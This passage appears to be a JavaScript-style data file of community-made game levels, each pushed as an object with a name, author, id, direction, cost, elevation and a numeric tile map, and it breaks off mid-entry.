maps.push({name="City Walkway",author="MoistNoodlez",id="#1660969278",direction="forward",cost=346,elevation=0,map=[0,0,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,0,0,0,0,1,90,5,5,5,5,5,5,5,5,5,5,5,5,90,1,0,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,0,0,0,0,1,5,3,5,5,5,90,5,5,90,5,5,5,92,5,1,0,0,0,0,1,5,17,17,17,17,88,5,5,88,17,17,17,17,5,1,0,0,0,0,1,5,17,17,17,17,5,5,5,5,17,17,17,17,5,1,0,0,0,0,1,5,17,17,17,17,5,5,5,5,17,17,17,17,5,1,0,0,0,0,1,93,5,5,5,5,88,5,5,88,5,5,5,5,93,1,0,0,0,0,1,5,19,19,19,19,5,5,5,5,19,19,19,19,5,1,0,0,0,0,1,5,19,19,19,19,5,5,5,5,19,19,19,19,5,1,0,0,0,0,1,90,5,5,5,5,88,5,5,88,19,19,19,19,5,1,0,0,0,0,1,5,21,21,21,21,5,5,5,5,19,19,19,127,5,1,0,0,0,0,1,5,21,21,21,21,5,5,5,5,19,19,19,19,5,1,0,0,0,0,1,94,5,5,5,5,88,5,5,88,5,5,5,5,94,1,0,0,0,0,1,5,5,23,23,5,5,5,5,5,5,90,90,90,5,1,0,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,0,0,0,0,1,24,24,24,24,24,95,95,95,95,24,24,24,24,24,1,0,0,0,0,1,24,24,1,5,5,5,5,5,5,5,5,1,24,24,1,0,0,0,0,1,100,24,1,66,5,5,5,5,5,5,66,1,24,100,1,0,0,0,0,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,0,0]});
maps.push({name="Castle Flick",author="MoistNoodlez",id="#1660969789",direction="left",cost=296,elevation=12,map=[0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,2,2,1,0,0,0,0,0,0,0,0,1,55,55,55,55,55,61,88,61,9,9,1,0,0,0,0,0,0,1,1,55,55,55,55,55,55,55,61,61,9,9,1,0,0,0,0,0,1,61,92,55,55,55,88,55,55,55,55,55,90,9,1,0,0,0,0,0,1,61,92,55,55,55,1,55,55,55,61,61,9,9,1,0,0,0,0,0,0,1,1,1,1,1,1,88,55,55,61,93,9,9,1,0,0,0,0,0,0,1,93,55,55,55,55,55,55,55,55,61,90,9,1,0,0,0,0,0,0,1,102,55,55,55,55,55,55,55,55,55,9,9,1,0,0,0,0,0,0,0,1,1,1,1,1,88,55,55,55,55,9,90,1,1,1,1,1,1,1,1,1,61,61,90,61,55,55,55,55,61,9,9,1,2,61,101,98,96,61,61,61,61,61,61,61,55,55,55,55,55,9,9,1,2,61,101,98,96,61,61,61,61,90,61,61,1,88,55,55,61,90,9,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,55,55,55,49,49,1,0,0,0,0,0,0,0,0,1,93,49,49,49,49,49,55,55,49,49,1,0,0,0,0,0,0,0,0,1,97,49,49,49,49,49,49,49,49,90,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,49,55,49,49,49,1,0,0,0,0,0,0,0,0,0,0,0,1,55,92,49,49,49,61,49,1,0,0,0,0,0,0,0,0,0,0,0,1,55,92,49,55,61,99,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Shape your destiny",author="Luffaren",id="#1660979430",direction="forward",cost=212,elevation=0,map=[0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,1,93,114,1,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,1,93,114,1,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,1,93,114,1,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,1,94,114,1,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,1,94,114,1,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,1,94,114,1,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0]});
maps.push({name="test area 01",author="fara",id="#1660984854",direction="forward",cost=377,elevation=10,map=[14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,14,14,14,14,0,0,0,0,0,0,5,5,5,5,5,0,24,24,24,24,14,14,14,14,0,0,0,0,0,0,5,76,76,76,5,0,24,24,24,24,14,14,14,14,3,5,5,5,5,5,5,76,133,76,5,0,24,24,24,24,14,14,14,14,0,5,66,66,66,5,5,76,76,76,5,0,23,23,23,23,14,14,14,14,0,5,66,131,66,5,5,5,25,5,5,0,22,22,22,22,14,14,14,14,0,5,66,66,66,5,0,5,25,5,5,0,21,21,21,21,14,14,14,14,3,5,5,25,5,5,5,5,25,5,5,0,20,20,20,20,14,96,14,14,0,0,5,5,25,5,5,25,5,5,0,0,19,19,19,19,96,3,96,14,0,0,0,5,5,25,25,5,5,0,0,0,18,18,18,18,24,24,24,24,0,0,0,5,5,25,25,5,5,0,0,0,17,17,17,17,24,97,24,24,0,0,5,5,25,5,5,25,5,5,0,0,16,16,16,16,24,24,24,24,0,5,5,25,5,5,5,5,25,5,5,0,15,15,15,15,24,24,24,23,0,5,66,66,66,5,0,5,25,5,5,0,14,14,14,14,24,24,24,23,0,5,66,134,66,5,5,5,25,5,5,5,12,13,13,13,24,24,24,23,0,5,66,66,66,5,5,76,76,76,5,5,11,12,13,13,24,24,24,24,0,5,5,5,5,5,5,76,132,76,5,5,11,12,13,13,24,24,24,24,0,0,0,0,0,0,5,76,76,76,5,5,11,12,13,13,24,24,24,24,0,0,0,0,0,0,5,5,5,5,5,5,12,13,13,13,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13]});
maps.push({name="Windows",author="Niikos",id="#1660994855",direction="forward",cost=786,elevation=0,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,76,76,76,76,76,76,76,76,22,22,70,70,70,70,70,70,70,70,1,1,76,76,76,76,76,76,76,76,22,22,70,70,70,70,70,70,70,70,1,1,76,76,76,76,76,76,76,76,22,22,70,70,70,70,70,70,70,70,1,1,76,76,76,76,76,76,76,76,22,22,70,70,70,70,70,70,70,70,1,1,76,76,76,76,76,76,76,76,22,22,70,70,70,70,70,70,70,70,1,1,76,76,76,76,76,76,76,76,22,22,70,70,70,70,70,70,70,70,1,1,76,76,76,76,76,76,76,76,22,22,70,70,70,70,70,70,70,70,1,1,76,76,76,76,76,76,76,76,22,22,70,70,70,70,70,70,70,70,1,1,93,93,22,22,22,22,22,22,22,22,22,22,22,22,22,22,94,94,1,1,100,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,100,1,1,126,126,126,126,126,126,126,126,22,22,40,40,40,40,40,40,40,40,1,1,126,126,126,126,126,126,126,126,22,22,40,40,40,40,40,40,40,40,1,1,126,126,126,126,126,126,126,126,22,22,40,40,40,40,40,40,40,40,1,1,126,126,126,126,126,126,126,126,22,22,40,40,40,40,40,40,40,40,1,1,126,126,126,126,126,126,126,126,22,22,40,40,40,40,40,40,40,40,1,1,126,126,126,126,126,126,126,126,22,22,40,40,40,40,40,40,40,40,1,1,126,126,126,126,126,126,126,126,22,22,40,40,40,40,40,40,40,40,1,1,126,126,126,126,126,126,126,126,22,22,40,40,40,40,40,40,40,40,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1]});
maps.push({name="TwistyTurnySlope",author="Niikos",id="#1660995434",direction="forward",cost=210,elevation=19,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,45,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,45,0,0,48,48,48,49,49,49,0,0,56,56,56,56,57,57,0,0,45,45,0,0,48,48,48,49,49,49,0,0,56,56,56,56,57,57,0,0,45,45,0,0,48,48,0,0,49,49,0,0,55,55,0,0,57,57,0,0,45,45,0,0,48,48,0,0,50,50,0,0,55,55,0,0,57,57,0,0,45,45,0,0,48,48,0,0,50,50,0,0,55,55,0,0,58,58,0,0,45,45,0,0,47,47,0,0,50,50,0,0,55,55,0,0,58,58,0,0,45,45,0,0,47,47,0,0,50,50,0,0,55,55,0,0,58,58,0,0,45,45,0,0,47,47,0,0,50,50,0,0,54,54,0,0,58,58,0,0,45,45,0,0,47,47,0,0,51,51,0,0,54,54,0,0,59,59,0,0,45,45,0,0,47,47,0,0,51,51,0,0,54,54,0,0,59,59,0,0,45,45,0,0,47,47,0,0,51,51,0,0,54,54,0,0,59,59,0,0,45,45,0,0,47,47,0,0,51,51,0,0,53,53,0,0,59,59,0,0,45,45,0,0,46,46,0,0,52,52,0,0,53,53,0,0,60,60,0,0,46,46,46,46,46,46,0,0,52,52,52,53,53,53,0,0,60,60,0,0,46,46,46,46,46,46,0,0,52,52,52,53,53,53,0,0,60,60,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,60,60,0,64,64,64,64,64,64,64,64,64,63,63,63,63,62,62,62,61,61,61,0,64,2,2,64,64,64,64,64,64,63,63,63,63,62,62,62,61,61,61,0]});
maps.push({name="DefendTheBoost",author="Niikos",id="#1660996419",direction="left",cost=173,elevation=0,map=[14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,2,2,14,2,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,2,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,65,65,65,0,0,0,0,0,0,128,14,14,14,14,14,14,14,14,14,14,65,65,65,0,0,0,0,0,0,128,14,14,14,14,14,14,14,14,14,14,65,65,65,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,65,65,65,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,65,65,65,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,126,126,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,93,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,24,24,0,93,24,24,24,24,24,24,65,65,65,0,0,0,0,0,0,128,24,24,0,94,94,24,24,24,24,24,65,65,65,0,0,0,0,0,0,128,24,100,0]});
maps.push({name="TheHiddenPath",author="Niikos",id="#1660997156",direction="forward",cost=272,elevation=0,map=[0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,34,34,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,34,34,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,1,0,0,1,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,1,0,0,1,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,1,0,0,1,91,91,1,1,1,1,1,1,1,1,1,1,1,34,34,34,1,0,0,1,86,91,1,0,0,0,0,0,0,0,0,0,1,34,34,34,1,0,0,1,91,86,1,0,0,0,0,0,0,0,0,0,1,34,34,34,1,0,0,1,86,91,1,0,0,34,100,34,0,0,0,0,1,34,34,34,1,0,0,1,94,94,0,0,0,34,34,34,0,0,0,0,92,34,34,34,1,0,0,1,94,94,0,0,0,34,34,34,0,0,0,0,92,34,34,34,1,0,0,1,91,86,1,0,0,93,34,93,0,0,0,0,1,34,34,34,1,0,0,1,86,91,1,0,0,0,0,0,0,0,0,0,1,34,34,34,1,0,0,1,91,86,1,0,0,0,0,0,0,0,0,0,1,34,34,34,1,0,0,1,91,91,1,1,1,1,1,1,1,1,1,1,1,34,34,34,1,0,0,1,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,1,0,0,1,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,1,0,0,1,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,1,0,0,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Liquids optimized",author="Luffaren",id="#1661001699",direction="left",cost=572,elevation=10,map=[1,1,1,1,1,1,1,1,14,14,14,14,14,14,14,2,2,14,0,0,1,94,22,22,21,94,14,14,14,14,14,14,14,14,14,14,14,14,34,0,1,22,90,22,20,14,90,14,14,14,65,65,65,65,65,65,65,14,0,0,1,94,22,22,19,94,14,14,14,14,65,65,65,66,66,66,66,14,34,0,1,1,1,22,18,17,16,15,14,14,14,14,66,66,66,72,72,14,0,0,1,0,1,22,22,22,22,22,90,68,68,68,66,66,66,74,74,74,67,0,1,0,1,22,22,22,22,22,14,68,14,14,66,66,66,74,74,74,67,0,1,1,1,20,20,22,22,22,90,68,14,14,66,70,66,74,74,74,67,0,90,24,24,20,20,22,22,90,14,68,14,90,14,14,90,14,14,14,0,0,24,24,24,20,20,21,21,22,1,69,1,22,22,22,22,22,22,22,0,0,0,24,24,20,20,20,20,20,1,68,68,66,14,14,93,14,22,22,0,0,24,24,24,20,20,127,20,20,1,1,1,14,14,14,14,93,65,65,67,0,0,24,24,20,20,20,20,20,1,1,1,80,75,75,75,14,65,65,67,0,24,24,24,14,14,20,14,20,1,1,1,14,75,75,75,93,14,65,67,0,2,75,77,84,84,84,84,84,82,20,20,20,76,76,76,20,20,20,40,0,2,75,77,84,84,84,84,82,82,20,94,20,76,76,76,20,93,20,0,0,24,24,24,20,20,14,20,82,82,14,20,14,82,82,82,14,20,14,0,0,24,24,23,22,21,20,20,82,84,84,84,84,84,84,84,84,84,84,77,0,24,24,23,22,21,20,20,84,84,84,84,84,84,84,84,84,84,84,77,0,24,24,24,24,24,20,20,14,14,20,14,20,20,20,20,20,14,20,40,40]});
maps.push({name="rapid water v2",author="fantasy",id="#1661001916",direction="left",cost=612,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,2,2,1,1,72,73,73,73,73,73,73,73,73,73,1,0,0,0,0,1,14,14,1,1,72,72,73,73,73,73,73,73,73,71,1,1,1,0,1,1,72,72,1,1,72,72,1,1,1,1,1,1,71,71,73,1,1,1,1,72,72,73,1,1,72,72,1,0,0,0,0,1,71,73,71,73,1,1,72,72,72,1,1,1,72,72,1,1,1,1,0,1,1,1,71,71,1,1,72,72,73,1,0,1,72,74,74,74,72,1,0,0,0,1,71,73,73,73,72,73,1,1,0,1,74,74,74,74,72,1,1,1,0,1,1,1,71,73,73,1,1,0,0,1,1,1,1,72,72,74,72,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,1,74,74,74,72,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,72,72,74,72,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,1,74,74,74,74,74,74,74,74,74,74,74,74,72,1,1,1,1,1,0,1,1,1,1,74,74,74,74,74,71,1,1,1,72,1,2,14,66,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,72,1,2,14,66,1,1,1,1,0,0,0,1,1,1,1,1,1,1,1,72,1,1,1,71,73,73,73,1,0,0,0,1,72,73,73,73,73,73,1,72,1,0,1,71,73,73,71,1,1,1,1,1,72,72,73,73,73,71,1,72,1,0,1,1,1,1,71,73,73,73,73,73,73,73,1,1,1,71,1,72,1,0,0,0,0,1,71,73,73,73,73,73,73,1,1,0,1,71,73,73,1,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,1,1,1,1,1]});
maps.push({name="DNA DOWN v2",author="MoistNoodlez",id="#1661012785",direction="forward",cost=228,elevation=-19,map=[0,0,1,124,124,93,124,2,2,124,94,124,124,1,0,0,0,0,0,0,0,0,1,123,123,1,1,1,1,1,1,123,123,1,0,0,0,0,0,0,0,0,1,1,122,65,65,65,65,65,65,122,1,1,0,0,0,0,0,0,0,0,0,1,121,121,0,0,0,0,121,121,1,0,0,0,0,0,0,0,0,0,0,1,1,120,120,0,0,120,120,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,119,119,119,119,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,118,118,118,118,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,117,117,0,0,117,117,1,1,0,0,0,0,0,0,0,0,0,0,1,116,116,65,65,65,65,116,116,1,0,0,0,0,0,0,0,0,0,0,1,95,0,0,0,0,0,0,95,1,0,0,0,0,0,0,0,0,0,0,1,95,75,75,75,75,75,75,95,1,0,0,0,0,0,0,0,0,0,0,1,95,0,0,0,0,0,0,95,1,0,0,0,0,0,0,0,0,0,0,1,116,116,65,65,65,65,116,116,1,0,0,0,0,0,0,0,0,0,0,1,1,115,115,0,0,115,115,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,114,114,114,114,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,113,113,113,113,1,1,1,0,0,0,0,0,0,0,0,0,1,1,110,111,112,0,0,112,111,110,1,1,0,0,0,0,0,0,0,0,1,108,109,65,65,65,65,65,65,109,108,1,0,0,0,0,0,0,0,0,1,107,1,1,1,1,1,1,1,1,107,1,0,0,0,0,0,0,0,0,1,106,105,94,105,2,2,105,93,105,106,1,0,0,0,0,0,0]});
maps.push({name="Boost Jump Break",author="MoistNoodlez",id="#1661012905",direction="forward",cost=171,elevation=0,map=[14,14,14,14,0,0,0,0,0,128,14,14,0,0,0,0,0,2,2,0,14,14,14,14,0,0,0,0,0,128,14,14,0,0,0,0,0,14,14,0,14,14,14,14,0,0,0,0,0,0,14,14,0,0,0,0,0,14,14,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,91,91,0,0,0,0,0,0,126,126,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,14,14,0,0,0,0,0,14,14,0,14,14,14,14,0,0,0,0,0,0,14,14,0,0,0,0,0,14,14,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,126,126,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,14,14,14,0,0,0,0,14,14,14,0,14,14,14,14,0,0,0,0,0,14,14,14,0,0,0,14,14,14,14,0,14,2,2,14,0,0,0,0,0,14,14,14,14,14,14,14,14,14,128,0]});
maps.push({name="magma chamber",author="fraz",id="#1661016405",direction="left",cost=507,elevation=-10,map=[1,1,1,1,77,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,2,10,10,10,81,5,5,5,5,5,5,5,5,5,5,5,120,120,120,1,2,10,10,10,81,5,5,5,5,5,5,5,5,5,5,5,119,119,119,1,1,10,10,10,81,5,5,5,5,5,5,5,5,5,5,5,119,119,119,1,1,10,10,10,81,5,5,5,5,5,5,5,5,5,5,5,119,119,119,1,1,5,5,5,81,5,5,5,5,5,5,5,5,5,5,3,119,119,119,1,77,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,77,83,83,1,1,5,12,5,5,5,5,5,5,81,5,5,5,5,5,5,119,119,119,1,1,112,112,112,5,5,5,5,5,81,5,5,5,5,5,5,119,119,119,1,1,112,112,112,5,5,5,5,5,81,83,83,81,5,5,5,119,119,119,1,1,112,112,112,5,5,5,5,5,81,5,5,81,5,5,5,118,118,118,1,1,112,112,112,5,5,5,5,5,81,5,5,81,5,5,5,117,117,117,1,1,112,112,112,5,5,5,5,5,81,5,5,83,83,81,5,116,116,116,1,1,112,112,112,5,5,5,5,5,81,5,5,5,5,81,5,1,1,95,1,1,112,112,112,5,5,5,5,5,81,5,5,5,5,83,83,77,83,83,1,1,112,112,112,5,5,5,5,5,81,5,5,5,5,5,5,115,115,115,1,1,112,112,112,112,112,112,112,112,77,1,113,113,113,113,114,115,115,115,1,1,112,112,112,112,112,112,112,112,81,1,113,113,113,113,114,115,115,115,1,1,112,112,112,112,112,112,112,112,81,95,113,113,113,113,114,115,115,115,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="water feature",author="fraz",id="#1661020004",direction="right",cost=335,elevation=-11,map=[24,24,2,2,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,24,24,24,24,24,24,24,24,24,24,24,24,24,24,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,24,13,13,13,74,74,74,74,74,74,74,74,72,13,90,13,90,13,97,13,24,13,13,13,71,13,71,13,71,13,13,13,72,13,13,13,13,13,13,13,24,13,13,24,67,24,67,24,67,24,13,13,72,13,90,13,90,13,13,13,24,13,13,24,71,24,71,24,71,24,24,13,72,13,13,13,13,13,13,13,24,13,13,24,65,65,65,65,65,74,67,74,74,74,74,74,74,74,24,24,24,13,13,24,24,24,24,24,24,24,24,13,13,13,24,13,13,13,96,13,2,13,13,13,13,13,13,13,13,13,13,13,13,13,24,13,13,13,96,13,2,97,13,13,13,13,13,13,13,13,13,13,13,13,24,13,13,13,24,24,24]});
maps.push({name="Ladder Defense",author="MoistNoodlez",id="#1661024292",direction="right",cost=201,elevation=-11,map=[0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,16,16,1,3,3,24,100,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,3,3,24,94,1,0,0,0,0,0,0,0,0,0,0,0,1,3,3,1,3,3,24,93,1,0,0,0,0,0,0,0,0,0,0,0,1,117,117,1,3,67,24,94,1,0,0,0,0,0,0,0,0,0,0,0,1,116,116,1,3,67,24,93,1,0,0,0,0,0,0,0,0,0,0,0,1,115,115,1,3,67,24,94,1,0,0,0,0,0,0,0,0,0,0,0,1,114,114,1,3,67,24,24,1,0,0,0,0,0,0,0,0,0,0,0,1,113,113,1,3,0,67,67,67,0,0,0,0,0,0,0,0,0,0,0,1,112,112,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,111,111,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,110,110,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,109,109,1,3,3,3,3,3,0,0,0,0,0,0,0,0,0,0,0,1,108,108,1,1,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,1,107,107,1,105,5,5,5,93,0,0,0,0,0,0,0,0,0,0,0,1,106,106,1,105,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,5,5,5,2,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,5,5,5,2,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1]});
maps.push({name="Sus lava",author="MoistNoodlez",id="#1661024881",direction="right",cost=374,elevation=-13,map=[0,0,0,0,0,1,18,2,2,18,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,18,18,18,18,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,1,18,18,18,18,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,1,66,19,19,19,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,1,66,19,19,19,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,1,66,66,19,19,19,66,66,66,1,0,0,0,0,0,0,0,0,0,0,1,66,66,19,19,19,20,20,20,1,0,0,0,0,0,0,0,0,0,0,1,66,66,66,19,19,20,20,20,1,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,20,20,20,121,1,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,66,66,1,121,1,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,66,66,1,121,1,0,0,0,0,0,0,0,0,1,1,1,1,1,121,122,1,1,1,95,1,0,0,0,0,0,0,0,0,1,113,114,76,79,79,79,79,76,1,121,1,0,0,0,0,0,0,0,0,1,113,114,76,79,79,79,79,76,119,120,1,0,0,0,0,0,0,0,0,1,113,114,114,115,116,117,118,119,119,1,1,1,1,1,1,1,1,1,1,1,113,114,96,96,96,96,96,96,119,1,105,96,5,5,5,5,1,112,112,112,113,113,77,77,77,77,77,77,1,1,105,96,5,5,5,2,1,112,1,1,1,1,44,44,44,44,44,44,105,97,105,96,5,5,5,2,1,112,111,111,111,111,110,109,108,107,106,105,105,105,105,96,5,5,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Duality v2",author="MoistNoodlez",id="#1661026802",direction="forward",cost=310,elevation=0,map=[0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,92,0,0,0,0,0,0,67,67,67,0,0,14,65,65,14,0,0,0,0,0,0,0,0,0,0,0,44,44,44,67,0,14,65,65,14,0,0,77,77,0,0,0,0,0,0,0,9,9,44,67,0,14,65,65,14,0,77,44,44,77,0,0,0,0,0,0,93,9,44,67,0,14,65,65,14,0,77,44,44,77,0,0,0,0,0,0,9,9,44,67,0,14,65,65,14,0,77,44,44,77,0,0,0,0,0,0,93,9,44,67,0,14,65,65,14,0,77,44,44,77,0,0,0,0,0,0,9,9,44,67,0,14,65,65,14,0,0,0,0,0,0,0,0,0,0,0,93,9,44,67,0,14,65,65,14,14,0,0,0,0,0,128,14,0,0,0,9,9,44,67,0,14,65,65,14,129,0,0,0,0,0,14,93,0,0,0,93,9,44,67,0,14,65,65,14,0,0,0,0,0,0,0,0,16,16,0,125,9,44,67,0,14,65,65,14,0,77,44,14,14,0,0,0,16,16,0,9,9,44,67,0,14,65,65,14,0,77,44,14,94,14,0,0,16,125,0,44,44,44,67,0,14,65,65,14,0,77,44,14,94,14,128,0,0,0,0,67,67,67,0,0,14,65,65,14,0,77,44,14,94,14,0,0,0,0,0,0,0,0,0,0,14,88,88,14,0,77,44,14,14,0,0,0,0,0,0,0,0,0,0,0,14,95,95,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="DIGlett v2",author="MoistNoodlez",id="#1661029794",direction="left",cost=377,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,14,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,14,90,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,90,14,14,14,90,1,0,0,1,1,91,91,91,91,91,91,91,91,91,91,91,14,90,14,93,1,0,0,1,91,91,91,91,91,91,91,91,91,91,91,91,14,14,14,1,1,0,1,1,91,91,0,1,1,91,76,76,91,91,91,91,1,14,14,14,1,1,2,14,91,91,91,91,91,91,76,76,91,91,91,91,90,14,14,14,90,1,2,14,91,91,91,91,91,91,76,76,91,91,91,91,91,90,14,14,93,1,1,1,91,91,0,1,1,91,76,76,91,91,91,91,91,14,14,14,90,1,0,1,91,91,91,91,9